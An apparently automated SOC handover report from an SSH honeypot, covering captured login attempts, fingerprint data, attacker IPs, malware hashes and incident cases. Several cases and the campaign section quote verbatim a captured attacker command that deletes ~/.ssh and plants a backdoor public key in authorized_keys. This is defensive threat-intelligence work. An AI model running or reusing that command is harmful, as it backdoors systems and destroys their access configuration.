# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-06 |
| **Generated At** | 2026-11-06T04:05:49Z |
| **Shift Time** | 04:05 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **59** |
| Confirmed Threats | **31** |
| False Positives Filtered | **28** (47.5%) |
| Unique Attacker IPs | **51** |
| Countries of Origin | **21** |
| High Severity Cases | **16** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **43** |
| Malware Samples Analyzed | **9** HIGH · **25** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **78** |
| Unique Credential Pairs | **31** |
| Unique Usernames | **16** |
| Unique Passwords | **23** |
| Successful Auth Pairs | **39** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `rootssssss23424123123` | 17 |
| `root` | 11 |
| `ubuntu` | 8 |
| `socks` | 4 |
| `hosting3` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `rootssssss23424123123` | 17 |
| `root3245gs5662d34111111111` | 17 |
| `` | 4 |
| `Host: www.google.com` | 3 |
| `admin` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 17 |
| `root` | `` | 4 |
| `ubuntu` | `root3245gs5662d34111111111` | 4 |
| `GET http://www.google.com/ HTTP/1.1` | `Host: www.google.com` | 3 |
| `admin` | `admin` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `socks` | `1234` | `141.11.0.18` | 2026-11-06T00:11:30 |
| `rootssssss23424123123` | `rootssssss23424123123` | `141.11.0.18` | 2026-11-06T00:11:32 |
| `socks` | `root3245gs5662d34111111111` | `141.11.0.18` | 2026-11-06T00:11:34 |
| `GET http://www.google.com/ HTTP/1.1` | `Host: www.google.com` | `2.26.255.47` | 2026-11-06T00:33:10 |
| `admin` | `admin` | `77.90.185.29` | 2026-11-06T00:33:59 |
| `GET http://www.google.com/ HTTP/1.1` | `Host: www.google.com` | `45.137.81.177` | 2026-11-06T00:36:47 |
| `admin` | `admin` | `10.0.0.73` | 2026-11-06T00:41:33 |
| `support` | `support` | `176.53.159.196` | 2026-11-06T00:41:36 |
| `CONNECT www.google.com:443 HTTP/1.1` | `Host: www.google.com:443` | `45.137.81.177` | 2026-11-06T00:46:20 |
| `CONNECT www.google.com:443 HTTP/1.1` | `Host: www.google.com:443` | `138.124.116.194` | 2026-11-06T00:49:22 |
| `root` | `Aa147258@` | `10.0.0.73` | 2026-11-06T00:52:14 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-11-06T00:52:17 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-11-06T00:52:20 |
| `CONNECT www.google.com:443 HTTP/1.1` | `Host: www.google.com:443` | `91.186.216.80` | 2026-11-06T00:53:37 |
| `aphrodite` | `aphrodite` | `195.86.192.66` | 2026-11-06T00:54:45 |
| `345gs5662d34` | `345gs5662d34` | `195.86.192.66` | 2026-11-06T00:54:49 |
| `aphrodite` | `3245gs5662d34` | `195.86.192.66` | 2026-11-06T00:54:51 |
| `hosting3` | `hosting3` | `211.95.159.159` | 2026-11-06T01:01:08 |
| `rootssssss23424123123` | `rootssssss23424123123` | `211.95.159.159` | 2026-11-06T01:01:12 |
| `hosting3` | `root3245gs5662d34111111111` | `211.95.159.159` | 2026-11-06T01:01:19 |
_… 19 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **59** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 15 |
| OpenSSH | 5 |
| Go SSH scanner | 3 |
| Perl Net::SSH | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 9 | 5 |
| `9052c4ab4164...` | Mirai/variant | 3 | 3 |
| `3c0eaacec19b...` | Mirai/variant | 2 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 9 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 4 | — |
| `9052c4ab4164...` | OpenSSH | 3 | 3 | Mirai/variant |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `390ffe68a68c...` | OpenSSH | 1 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `85.95.166.40`, `195.86.192.66`, `141.11.0.18`, `211.95.159.159`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **51** |
| Unique ASNs | **25** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 18 | HIGH |
| `AS213412` | ONYPHE SAS | 6 | LOW |
| `AS396982` | Google LLC | 3 | LOW |
| `AS50219` | Valence Technology Co. | 2 | MEDIUM |
| `AS12389` | PJSC Rostelecom | 2 | HIGH |
| `AS29091` | ipNX Nigeria Limited | 1 | LOW |
| `AS14618` | Amazon.com, Inc. | 1 | MEDIUM |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (11)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-baf62a1d838b

| Field | Detail |
|---|---|
| **Source IP** | `141.11.0[.]18` |
| **First Seen** | 2026-11-06 00:11 |
| **Last Seen** | 2026-11-06 00:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 00:11:29` | `cowrie.session.connect` |
| `2026-11-06 00:11:29` | `cowrie.client.version` |
| `2026-11-06 00:11:30` | `cowrie.client.kex` |
| `2026-11-06 00:11:30` | `cowrie.login.success` |
| `2026-11-06 00:11:31` | `cowrie.session.params` |
| `2026-11-06 00:11:31` | `cowrie.command.input` |
| `2026-11-06 00:11:31` | `cowrie.command.failed` |
| `2026-11-06 00:11:31` | `cowrie.log.closed` |
| `2026-11-06 00:11:32` | `cowrie.session.params` |
| `2026-11-06 00:11:32` | `cowrie.command.input` |
| `2026-11-06 00:11:32` | `cowrie.session.file_download` |
| `2026-11-06 00:11:32` | `cowrie.log.closed` |
| `2026-11-06 00:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.0[.]18` to AbuseIPDB if not already reported
- [ ] Block `141.11.0[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81aa2969b741

| Field | Detail |
|---|---|
| **Source IP** | `141.11.0[.]18` |
| **First Seen** | 2026-11-06 00:11 |
| **Last Seen** | 2026-11-06 00:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 00:11:32` | `cowrie.session.connect` |
| `2026-11-06 00:11:32` | `cowrie.client.version` |
| `2026-11-06 00:11:32` | `cowrie.client.kex` |
| `2026-11-06 00:11:32` | `cowrie.login.success` |
| `2026-11-06 00:11:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.0[.]18` to AbuseIPDB if not already reported
- [ ] Block `141.11.0[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9619dd5bbf7

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]29` |
| **First Seen** | 2026-11-06 00:33 |
| **Last Seen** | 2026-11-06 00:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 00:33:58` | `cowrie.session.connect` |
| `2026-11-06 00:33:58` | `cowrie.client.version` |
| `2026-11-06 00:33:58` | `cowrie.client.kex` |
| `2026-11-06 00:33:59` | `cowrie.login.success` |
| `2026-11-06 00:34:01` | `cowrie.direct-tcpip.request` |
| `2026-11-06 00:34:01` | `cowrie.direct-tcpip.ja4` |
| `2026-11-06 00:34:01` | `cowrie.direct-tcpip.data` |
| `2026-11-06 00:34:02` | `cowrie.direct-tcpip.request` |
| `2026-11-06 00:34:02` | `cowrie.direct-tcpip.ja4` |
| `2026-11-06 00:34:02` | `cowrie.direct-tcpip.data` |
| `2026-11-06 00:34:04` | `cowrie.direct-tcpip.request` |
| `2026-11-06 00:34:04` | `cowrie.direct-tcpip.ja4` |
| `2026-11-06 00:34:04` | `cowrie.direct-tcpip.data` |
| `2026-11-06 00:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]29` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e01c5e134a6d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-06 00:41 |
| **Last Seen** | 2026-11-06 00:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 00:41:36` | `cowrie.session.connect` |
| `2026-11-06 00:41:36` | `cowrie.client.version` |
| `2026-11-06 00:41:36` | `cowrie.client.kex` |
| `2026-11-06 00:41:36` | `cowrie.login.success` |
| `2026-11-06 00:41:36` | `cowrie.direct-tcpip.request` |
| `2026-11-06 00:41:36` | `cowrie.direct-tcpip.data` |
| `2026-11-06 00:41:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ecc5bb7c1f7

| Field | Detail |
|---|---|
| **Source IP** | `91.186.216[.]80` |
| **First Seen** | 2026-11-06 00:53 |
| **Last Seen** | 2026-11-06 00:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 00:53:36` | `cowrie.session.connect` |
| `2026-11-06 00:53:37` | `cowrie.login.success` |
| `2026-11-06 00:53:37` | `cowrie.session.params` |
| `2026-11-06 00:53:37` | `cowrie.command.input` |
| `2026-11-06 00:53:37` | `cowrie.log.closed` |
| `2026-11-06 00:53:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.186.216[.]80` to AbuseIPDB if not already reported
- [ ] Block `91.186.216[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ae9fb835b35

| Field | Detail |
|---|---|
| **Source IP** | `195.86.192[.]66` |
| **First Seen** | 2026-11-06 00:54 |
| **Last Seen** | 2026-11-06 00:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 00:54:44` | `cowrie.session.connect` |
| `2026-11-06 00:54:44` | `cowrie.client.version` |
| `2026-11-06 00:54:44` | `cowrie.client.kex` |
| `2026-11-06 00:54:45` | `cowrie.login.success` |
| `2026-11-06 00:54:46` | `cowrie.session.params` |
| `2026-11-06 00:54:46` | `cowrie.command.input` |
| `2026-11-06 00:54:46` | `cowrie.command.failed` |
| `2026-11-06 00:54:47` | `cowrie.log.closed` |
| `2026-11-06 00:54:48` | `cowrie.session.params` |
| `2026-11-06 00:54:48` | `cowrie.command.input` |
| `2026-11-06 00:54:48` | `cowrie.session.file_download` |
| `2026-11-06 00:54:48` | `cowrie.log.closed` |
| `2026-11-06 00:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.86.192[.]66` to AbuseIPDB if not already reported
- [ ] Block `195.86.192[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0897dcfe2215

| Field | Detail |
|---|---|
| **Source IP** | `195.86.192[.]66` |
| **First Seen** | 2026-11-06 00:54 |
| **Last Seen** | 2026-11-06 00:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 00:54:48` | `cowrie.session.connect` |
| `2026-11-06 00:54:48` | `cowrie.client.version` |
| `2026-11-06 00:54:48` | `cowrie.client.kex` |
| `2026-11-06 00:54:49` | `cowrie.login.success` |
| `2026-11-06 00:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.86.192[.]66` to AbuseIPDB if not already reported
- [ ] Block `195.86.192[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8be45bfa878

| Field | Detail |
|---|---|
| **Source IP** | `211.95.159[.]159` |
| **First Seen** | 2026-11-06 01:01 |
| **Last Seen** | 2026-11-06 01:01 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 01:01:07` | `cowrie.session.connect` |
| `2026-11-06 01:01:07` | `cowrie.client.version` |
| `2026-11-06 01:01:07` | `cowrie.client.kex` |
| `2026-11-06 01:01:08` | `cowrie.login.success` |
| `2026-11-06 01:01:09` | `cowrie.session.params` |
| `2026-11-06 01:01:09` | `cowrie.command.input` |
| `2026-11-06 01:01:09` | `cowrie.command.failed` |
| `2026-11-06 01:01:10` | `cowrie.log.closed` |
| `2026-11-06 01:01:11` | `cowrie.session.params` |
| `2026-11-06 01:01:11` | `cowrie.command.input` |
| `2026-11-06 01:01:11` | `cowrie.session.file_download` |
| `2026-11-06 01:01:11` | `cowrie.log.closed` |
| `2026-11-06 01:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.95.159[.]159` to AbuseIPDB if not already reported
- [ ] Block `211.95.159[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c41e120393e

| Field | Detail |
|---|---|
| **Source IP** | `211.95.159[.]159` |
| **First Seen** | 2026-11-06 01:01 |
| **Last Seen** | 2026-11-06 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 01:01:11` | `cowrie.session.connect` |
| `2026-11-06 01:01:11` | `cowrie.client.version` |
| `2026-11-06 01:01:11` | `cowrie.client.kex` |
| `2026-11-06 01:01:12` | `cowrie.login.success` |
| `2026-11-06 01:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.95.159[.]159` to AbuseIPDB if not already reported
- [ ] Block `211.95.159[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8861e364ec2

| Field | Detail |
|---|---|
| **Source IP** | `85.95.166[.]40` |
| **First Seen** | 2026-11-06 02:05 |
| **Last Seen** | 2026-11-06 02:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 02:05:07` | `cowrie.session.connect` |
| `2026-11-06 02:05:07` | `cowrie.client.version` |
| `2026-11-06 02:05:07` | `cowrie.client.kex` |
| `2026-11-06 02:05:08` | `cowrie.login.success` |
| `2026-11-06 02:05:09` | `cowrie.session.params` |
| `2026-11-06 02:05:09` | `cowrie.command.input` |
| `2026-11-06 02:05:09` | `cowrie.command.failed` |
| `2026-11-06 02:05:09` | `cowrie.log.closed` |
| `2026-11-06 02:05:09` | `cowrie.session.params` |
| `2026-11-06 02:05:09` | `cowrie.command.input` |
| `2026-11-06 02:05:10` | `cowrie.session.file_download` |
| `2026-11-06 02:05:10` | `cowrie.log.closed` |
| `2026-11-06 02:05:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.95.166[.]40` to AbuseIPDB if not already reported
- [ ] Block `85.95.166[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-728317e1590d

| Field | Detail |
|---|---|
| **Source IP** | `85.95.166[.]40` |
| **First Seen** | 2026-11-06 02:05 |
| **Last Seen** | 2026-11-06 02:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-06 02:05:10` | `cowrie.session.connect` |
| `2026-11-06 02:05:10` | `cowrie.client.version` |
| `2026-11-06 02:05:10` | `cowrie.client.kex` |
| `2026-11-06 02:05:10` | `cowrie.login.success` |
| `2026-11-06 02:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.95.166[.]40` to AbuseIPDB if not already reported
- [ ] Block `85.95.166[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **2** | 2026-11-06 00:21 | 2026-11-06 02:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.180.45[.]187` | 1 | 2026-11-06 01:48 | 2026-11-06 01:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.99.27[.]125` | 1 | 2026-11-06 00:38 | 2026-11-06 00:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-11-06 00:55 | 2026-11-06 00:55 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.118[.]150` | 1 | 2026-11-06 00:15 | 2026-11-06 00:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.32.198[.]210` | 1 | 2026-11-06 02:12 | 2026-11-06 02:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.99.210[.]150` | 1 | 2026-11-06 00:24 | 2026-11-06 00:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]195` | 1 | 2026-11-06 01:35 | 2026-11-06 01:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.226.78[.]133` | 1 | 2026-11-06 01:49 | 2026-11-06 01:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.131.220[.]121` | 1 | 2026-11-06 02:05 | 2026-11-06 02:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-11-06 01:08 | 2026-11-06 01:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.109.23[.]53` | 1 | 2026-11-06 00:03 | 2026-11-06 00:04 | 1s | 0 | `T1592` | 🟢 LOW |
| `5.58.0[.]143` | 1 | 2026-11-06 02:20 | 2026-11-06 02:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]122` | 1 | 2026-11-06 02:53 | 2026-11-06 02:53 | 2s | 0 | `T1592` | 🟢 LOW |
| `70.174.30[.]78` | 1 | 2026-11-06 02:37 | 2026-11-06 02:37 | 16s | 0 | `T1592` | 🟢 LOW |
| `74.207.243[.]103` | 1 | 2026-11-06 01:33 | 2026-11-06 01:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-06 01:58 | 2026-11-06 01:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.82.65[.]22` | 1 | 2026-11-06 02:18 | 2026-11-06 02:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]41` | 1 | 2026-11-06 00:45 | 2026-11-06 00:45 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
